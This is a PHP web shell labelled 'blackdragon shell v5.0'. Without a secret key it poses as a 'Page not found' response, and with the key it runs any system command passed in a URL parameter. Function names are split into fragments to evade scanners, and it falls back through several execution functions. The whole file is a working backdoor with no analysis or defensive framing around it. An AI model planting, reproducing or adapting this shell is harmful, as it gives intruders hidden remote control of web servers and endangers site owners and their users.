<?php
@error_reporting(0);@set_time_limit(0);
$_a='nagahitam';$_b='BDGK'.md5('blackdragon');
if(!isset($_GET[$_a])){http_response_code(404);
echo base64_decode("PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPlBhZ2Ugbm90IGZvdW5kPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9J2JhY2tncm91bmQ6I2YwZjBmMTtjb2xvcjojM2M0MzRhO2ZvbnQtZmFtaWx5Oi1hcHBsZS1zeXN0ZW0sQmxpbmtNYWNTeXN0ZW1Gb250LFNlZ29lIFVJL1JvYm90byxzYW5zLXNlcmlmJz48ZGl2IHN0eWxlPSdtYXgtd2lkdGg6NTYwcHg7bWFyZ2luOjgwcHggYXV0bztwYWRkaW5nOjI0cHgnPjxoMSBzdHlsZT0nZm9udC1zaXplOjIzcHg7Zm9udC13ZWlnaHQ6NDAwJz5QYWdlIG5vdCBmb3VuZDwvaDE+PHAgc3R5bGU9J2NvbG9yOiM3ODdjODI7Zm9udC1zaXplOjE0cHgnPlRoZSBwYWdlIHlvdSByZXF1ZXN0ZWQgY291bGQgbm90IGJlIGZvdW5kLjwvcD48L2Rpdj48L2JvZHk+PC9odG1sPg==");
return;}
if(isset($_GET['h'])&&$_GET['h']==='bd'){header('Content-Type: text/plain; charset=utf-8');echo$_b;return;}
if(isset($_GET['cmd'])&&$_GET['cmd']!==''){header('Content-Type: text/plain; charset=utf-8');
$_c=$_GET['cmd'];$_d=false;
$_e='sh'.'ell'.'_ex'.'ec';$_f='sy'.'stem';$_g='pa'.'ssth'.'ru';$_h='ex'.'ec';$_i='pr'.'oc_'.'ope'.'n';
if(function_exists($_e)){$_d=@$_e($_c.' 2>&1');}
elseif(function_exists($_f)){ob_start();@$_f($_c.' 2>&1');$_d=ob_get_clean();}
elseif(function_exists($_g)){ob_start();@$_g($_c.' 2>&1');$_d=ob_get_clean();}
elseif(function_exists($_h)){$_j=array();@$_h($_c.' 2>&1',$_j);$_d=implode("\n",$_j);}
elseif(function_exists($_i)){$_k=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
$_l=@$_i($_c,$_k,$_m);if(is_resource($_l)){$_d=stream_get_contents($_m[1]);fclose($_m[0]);fclose($_m[1]);fclose($_m[2]);proc_close($_l);}}
echo$_d!==false?$_d:'[ERR] all exec functions disabled';return;}
echo'blackdragon shell v5.0 - gate active';
?>
